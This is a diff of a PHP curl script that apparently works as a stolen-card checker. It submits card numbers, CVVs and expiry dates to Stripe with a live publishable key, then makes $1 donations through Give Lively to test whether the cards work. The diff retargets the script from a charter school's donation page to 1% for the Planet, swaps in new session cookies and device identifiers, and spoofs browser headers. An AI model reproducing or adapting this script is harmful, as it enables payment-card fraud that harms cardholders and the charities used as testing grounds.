@@ -238,7 +238,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'path: /v1/payment_methods',
 'scheme: https',
 'accept: application/json',
-'accept-language: en-US,en;q=0.9,bn;q=0.8',
+'accept-language: en-US,en;q=0.5',
 'content-type: application/x-www-form-urlencoded',
 'origin: https://js.stripe.com',
 'referer: https://js.stripe.com/',
@@ -256,7 +256,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[address][postal_code]='.$postcode.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F663dfdbb7%3B+stripe-js-v3%2F663dfdbb7&time_on_page=132507&key=pk_live_GWQnyoQBA8QSySDV4tPMyOgI');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=8a222f87-65f7-4425-a54a-b6349c1249bf0c6a7f&muid=0f01574e-1015-447d-a01f-591ccd6b7977c3df52&sid=1dceafbb-3e46-4805-8928-c02e8526647630a8fe&pasted_fields=number&payment_user_agent=stripe.js%2F663dfdbb7%3B+stripe-js-v3%2F663dfdbb7&time_on_page=87831&key=pk_live_GWQnyoQBA8QSySDV4tPMyOgI');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
@@ -285,19 +285,19 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 'accept: application/json, text/javascript, */*; q=0.01',
 'accept-language: en-US,en;q=0.9,bn;q=0.8',
 'content-type: application/json;charset=UTF-8',
-'cookie: datadome=XZgwPXi4YuY2cxYXCUIkdNLO2g1Ebv6hc4q6iXwTYG~8STFaVTdXMCRiF60g58zfNtQYlREXi2UHlKT_7zYeVIKzxoIsyOnODmpoI5.LkaTsVOwBovrVd3vbjOjf2Kf; _give-lively_session=og7fnqc1/g4lvSGjq4lBryoAYA8d9ALCoY/Ae1NEebqRDmVCU1YmxgpJHaXyeZ0HmN3JpfxbL4PIJ/u5eS73UTrIYikRD1fRP8uKuYHFwCCHDPPO8iZy3ywiK44wYgouRdmVPQK5tkkijhvWJ+4St8uJVLxzQ+He9Re89i+jO/6q7yZ15zjmeQGwTbjLCtbg1acExrkAYke6jbOSShFoX5xNIf5Wpwqea0x/uvyL3GlFaD8VI/SmiPKEZTr06AqTOo31PO+lxdwLe8wh8vQrYrNkqSy0zjecp1k7xA==--3ra6S6AqFDFfpcXY--1v9li7NRy6uskY9//41KJg==',
+'cookie: _give-lively_session=8rSlDub6k6toONx4dIi86MTvGMgGvogB%2F8HYBHPfoG%2Fc0hwcR0n206BvCOlMY%2B%2FB5AWcVkhyLYwuJUcJbLAQIxnDdUFCOGCbXDg3XDo6kbZD2y8LdWVzw%2Bo38%2BuydQco3JMsNjvZ9eMJclsFDB9z7Y4DNAWaLIZIGxVT0x4JJcbwvITUIaMvxRucRNcIXoRt7vpAfBJHfZBCZyI2rJ3al9zXudnhWQiaLi0TCdXOhN35bfetVkjuhqgeP2S6EgHgwU7fwvfElwte6%2BQJE97rSwcKg56o5DwRERfGHw%3D%3D--eeSKUd167J1UlNMP--%2B6vwYlDkABe55dDdirjMOA%3D%3D; _ga=GA1.2.227033868.1646742616; _gid=GA1.2.348731168.1646742616; _gali=payment-method-submit',
 'origin: https://secure.givelively.org',
-'referer: https://secure.givelively.org/donate/environmental-charter-school-at-frick-park',
+'referer: https://secure.givelively.org/donate/1-for-the-planet?recurring=false&override_amount=1&dedication_name=&dedication_email=&dedication_type=&widget_type=simple_donation&widget_url=https%3A%2F%2Fwww.onepercentfortheplanet.org%2Fdonate&referrer_url=',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
-'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
+'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
 'x-requested-with: XMLHttpRequest',
    ));
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'{"auth_token":null,"donation":{"user_email":"'.$email.'","full_name":"'.$name.'+'.$last.'","zip_code":"'.$postcode.'","country":"US","amount":1,"stripe_token":"'.$id.'","stripe_customer_id":null,"guidestar_identifier":"8870056","recurring":false,"save_card":true,"share_details_opt_in":true,"private":false,"covering_transaction_fee":null,"transaction_fee":"","ref":null,"campaign":{},"nonprofit_name":"Environmental Charter School","utm_source":null,"activePaymentMethod":"creditCard","required_donatable_questions":[],"optional_donatable_questions":[],"widget_type":null,"widget_url":null,"referrer_url":"https://ecspgh.org/","ticket_order":null,"idempotency_key":"1ba8a55b-b753-403f-9464-5c87ac53e9df","event_id":null,"page_type":"nonprofit","team_id":null,"use_saved_card":false},"slug":"environmental-charter-school-at-frick-park"}');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'{"auth_token":null,"donation":{"user_email":"'.$email.'","full_name":"'.$name.'+'.$last.'","zip_code":null,"country":"US","amount":1,"stripe_token":"pm_1Kb2CXE7e1hvLgXjzfzp7Uth","stripe_customer_id":null,"guidestar_identifier":"8357061","recurring":false,"save_card":false,"share_details_opt_in":true,"private":false,"covering_transaction_fee":null,"transaction_fee":"","ref":null,"campaign":{},"nonprofit_name":"1% for the Planet","utm_source":null,"activePaymentMethod":"creditCard","required_donatable_questions":[{"id":"'.$id.'","body":"Mailing Address","explanation":"","required":true,"sort_order":3,"answer_data_type":"address","input_type":null,"input":{"value":"10080","state":"COMPLETE","validity":true},"address_attributes":{"administrative_area_level_1":{"value":"NY","state":"IN_PROGRESS","validity":true},"administrative_area_level_2":{"value":"New York","state":"IN_PROGRESS","validity":true},"custom_field":{"value":"","state":"UNTOUCHED","validity":null},"street_address":{"value":"undefined W 145th St","state":"IN_PROGRESS","validity":true},"postal_code":{"value":"10080","state":"COMPLETE","validity":true}},"phone_attributes":{"number":{"value":"","state":"UNTOUCHED","validity":null}},"organization_attributes":{"name":{"value":"","state":"UNTOUCHED","validity":null}}}],"optional_donatable_questions":[],"widget_type":"simple_donation","widget_url":"https://www.onepercentfortheplanet.org/donate","referrer_url":"","ticket_order":null,"idempotency_key":"efeb5b61-3e25-46b6-abe9-fe4f247d7021","event_id":null,"page_type":"nonprofit","team_id":null,"dedication_attributes":{"type":"","name":"","email":""},"use_saved_card":false},"slug":"1-for-the-planet"}');
 
 
 $result2 = curl_exec($ch);
